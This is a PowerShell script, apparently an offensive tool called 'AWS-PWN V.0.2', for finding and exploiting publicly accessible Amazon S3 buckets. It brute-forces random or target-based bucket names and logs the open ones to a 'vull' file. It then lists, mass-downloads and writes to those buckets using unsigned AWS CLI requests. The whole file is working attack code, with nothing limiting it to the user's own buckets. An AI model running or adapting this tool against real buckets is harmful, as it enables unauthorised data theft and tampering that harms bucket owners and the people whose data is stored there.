
 write-host "=============================================================================================" -foregroundcolor cyan
$multiplelines = @"
________  ___       __   ________                 ________  ___       __   ________      
|\   __  \|\  \     |\  \|\   ____\               |\   __  \|\  \     |\  \|\   ___  \    
\ \  \|\  \ \  \    \ \  \ \  \___|_  ____________\ \  \|\  \ \  \    \ \  \ \  \\ \  \   
 \ \   __  \ \  \  __\ \  \ \_____  \|\____________\ \   ____\ \  \  __\ \  \ \  \\ \  \  
  \ \  \ \  \ \  \|\__\_\  \|____|\  \|____________|\ \  \___|\ \  \|\__\_\  \ \  \\ \  \ 
   \ \__\ \__\ \____________\____\_\  \              \ \__\    \ \____________\ \__\\ \__\
    \|__|\|__|\|____________|\_________\              \|__|     \|____________|\|__| \|__| V.0.2
                            \|_________|          				
"@
Write-Host $multiplelines -foregroundcolor white	
 write-host "=============================================================================================" -foregroundcolor cyan				
write-host "                             Aws-Pwn s3 Ataide - Junior = = = jvz107"
write-host " --------------------------------------------------------------------------------------------" -foregroundcolor cyan	
write-host "                                                     " -foregroundcolor white                                                              
#m==========================================menu 

$menu = @"
[1] - brute force s3 bucket (Random) 
[2] - custom s3 bucket list
[3] - brute force s3 bucket 

[0] - download s3 bucket 
[00] - upload file to s3 bucket 

Select Script by the Number 
"@

$r = Read-Host $menu

Switch ($r) {
"1" {
#======================================================init-genlist
$gen = read-host "Number of url to generate"
$gen2 = read-host "Number of characters"
write-host "====================================" -foregroundcolor red
write-host "Generating random bucket list" -foregroundcolor yellow 
write-host "..................................." -foregroundcolor yellow
Start-Transcript -Path "awslist.txt" |out-null

$test = 1..$gen | foreach { -join ($Urls = Get-Random -InputObject q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m,1,2,3,4,5,6,7,8,9,0 -Count $gen2 )| % {write-Host  "$_"} 

}
Stop-transcript |out-null
$lines = Get-Content awslist.txt
$first = $lines[0]
$lines | where { $_ -ne $first } | Select-Object -skip 14 -first $gen | out-file awslist.txt


#=========================================================fim==genlist

write-host "-----------------------------------------------" -foregroundcolor yellow 
write-host "Starting aws s3 brute-force" -foregroundcolor yellow 
$wordl = get-content "awslist.txt"
foreach ($words in $wordl)
{
$url = try {Invoke-WebRequest -Uri "$words.s3.amazonaws.com" } catch { $_.Exception.Response } 
     if ($url.StatusCode -eq "200") {
If (iwr "$words.s3.amazonaws.com" | Select-String -Pattern "<Name>" -CaseSensitive ){ 
write-host "-----------------------------------------------" -foregroundcolor red
write-host "[$words vull]" -foregroundcolor yellow
write-host "Start listing for $words " -foregroundcolor yellow
aws s3 ls s3://$words --no-sign-request
add-content vull.txt "$words.s3.amazonaws.com/"
}
}
Else 
{
write-host "-----------------------------------------------" -foregroundcolor green
$error = write-host "$words Not vull" -foregroundcolor cyan | out-null

} 

}
write-Host "----------------------------------------" -foregroundcolor cyan 
write-Host "Vulnerable list saved as vull.txt" -foregroundcolor cyan 
write-Host "----------------------------------------" -foregroundcolor cyan 
}
#======================================================fim menu 1

"2" {
$getlist = read-host "Aws bucket list txt "

$wordl = get-content "$getlist"
foreach ($words in $wordl)
{
$url = try {Invoke-WebRequest -Uri "$words.s3.amazonaws.com" } catch { $_.Exception.Response } 
     if ($url.StatusCode -eq "200") {
If (iwr "$words.s3.amazonaws.com" | Select-String -Pattern "<Name>" -CaseSensitive ){ 
write-host "-----------------------------------------------" -foregroundcolor red
write-host "[$words vull]" -foregroundcolor yellow
write-host "Start listing for $words " -foregroundcolor yellow
aws s3 ls s3://$words --no-sign-request
add-content vull.txt "$words.s3.amazonaws.com/"
}
}
Else 
{
write-host "-----------------------------------------------" -foregroundcolor green
$error = write-host "$words Not vull" -foregroundcolor cyan | out-null

} 

}
}

"3" {
$bucket = read-host "Target "

$wordl = get-content "conf.txt"
$wordl2 = get-content "conf2.txt"

foreach ($words in $wordl)
{
$url0 = try {Invoke-WebRequest -Uri "$bucket$words.s3.amazonaws.com" } catch { $_.Exception.Response } 
     if ($url0.StatusCode -eq "200") {
If (iwr "$bucket$words.s3.amazonaws.com" | Select-String -Pattern "<Name>" -CaseSensitive ){ 
write-host "-----------------------------------------------" -foregroundcolor red
write-host "[$bucket$words vull]" -foregroundcolor yellow
write-host "Start listing for $words " -foregroundcolor yellow
aws s3 ls s3://$bucket$words --no-sign-request
add-content vull.txt "$bucket$words.s3.amazonaws.com/"
}
}
Else 
{
write-host "-----------------------------------------------" -foregroundcolor green
$error2 = write-host "$bucket$words Not vull" -foregroundcolor cyan | out-null

} 

}

foreach ($words in $wordl2)
{
$url = try {Invoke-WebRequest -Uri "$words$bucket.s3.amazonaws.com" } catch { $_.Exception.Response } 
     if ($url.StatusCode -eq "200") {
If (iwr "$words$bucket.s3.amazonaws.com" | Select-String -Pattern "<Name>" -CaseSensitive ){ 
write-host "-----------------------------------------------" -foregroundcolor red
write-host "[$words$bucket vull]" -foregroundcolor yellow
write-host "Start listing for $words " -foregroundcolor yellow
aws s3 ls s3://$words$bucket --no-sign-request
add-content vull.txt "$words$bucket.s3.amazonaws.com/"
}
}
Else 
{
write-host "-----------------------------------------------" -foregroundcolor green
$error2 = write-host "$words$bucket Not vull" -foregroundcolor cyan | out-null

} 

}

}




"0" {
$s3down = read-host " s3 bucket to  download "
mkdir aws-down/$s3down | out-null 
cd aws-down/$s3down
aws s3 sync s3://$s3down  . --no-sign-request
cd..
cd..
write-host "--------------------------------------" 
write-host "files saved at aws-down/$s3down" -foregroundcolor yellow
write-host "--------------------------------------" 

}

"00" {

$s3up = read-host "bucket to upload  "
write-host "--------------------------------------" 
aws s3 cp test.png s3://$s3up --no-sign-request 

}


"Q" {
    Write-Host "Quitting" -ForegroundColor Red
}

default {
    Write-Host "error 404 script not found :p ." -ForegroundColor Yellow

} #fim?
}
